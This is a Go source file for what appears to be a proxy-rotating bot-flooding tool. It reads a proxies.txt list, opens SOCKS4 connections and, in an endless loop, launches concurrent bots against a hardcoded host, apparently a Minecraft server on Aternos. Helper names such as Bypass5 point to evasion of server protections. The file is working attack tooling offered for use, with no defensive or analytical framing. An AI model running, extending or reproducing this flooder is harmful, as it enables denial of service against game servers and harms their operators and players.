package main

import (
	"bufio"
	"fmt"
	"go-pen/methods"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"h12.io/socks"
)

func getArguments(cleanArgs []string) (string, int, int) {
	argsMessage := "Arguments: <ip:port> <threads> <loop>"

	if len(cleanArgs) < 3 {
		fmt.Println(argsMessage)
		os.Exit(1) // is it a good way to do that....
	}

	var serverAddress = cleanArgs[0]

	if !strings.Contains(serverAddress, ":") {
		fmt.Println(argsMessage)
		os.Exit(1)
	}

	threads, err := strconv.Atoi(cleanArgs[1])
	loop, errn := strconv.Atoi(cleanArgs[2])

	if err != nil || errn != nil {
		fmt.Println(argsMessage)
		os.Exit(1)
	}

	return serverAddress, threads, loop
}

func parseProxies() []string {
	file, err := os.Open("proxies.txt")

	if err != nil {
		log.Fatal("Something is wrong with proxies.txt, ", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	var proxies []string

	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	file.Close()

	return proxies
}

func connect(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)

	dialSocks := socks.Dial(address)
	conn, err := dialSocks("tcp", serverAddress)

	if err != nil {
		<-guard
	} else {
		for {
			if methods.Bypass5(data, conn) {
				fmt.Println(proxyAddress)
				<-guard
				return
			}

			time.Sleep(1 * time.Millisecond)
		}
	}
}

/*
func connectBot(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)

	dialSocks := socks.Dial(address)
	conn, err := dialSocks("tcp", serverAddress)

	if err != nil {

	}

	methods.SlowBot(&data)
	//conn, err := dialSocks("tcp", serverAddress)
}
*/

const (
	host = "ravmda.aternos.me"
	port = "53799"
)

func createProxyBot(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)

	dialSocks := socks.Dial(address)
	conn, err := dialSocks("tcp", serverAddress)

	if err != nil {
		<-guard
	} else {
		methods.CreateBot(data, conn, guard)
	}
}

func main() {
	proxies := parseProxies()
	data := methods.Data{Host: host, Port: port}

	connections := 20 //, _ := strconv.Atoi(os.Args[1:][0])

	guard := make(chan struct{}, connections)
	fmt.Println(len(guard))

	for {
		for _, proxy := range proxies {
			guard <- struct{}{}
			go createProxyBot(proxy, host+":"+port, &data, guard)
		}
	}
}
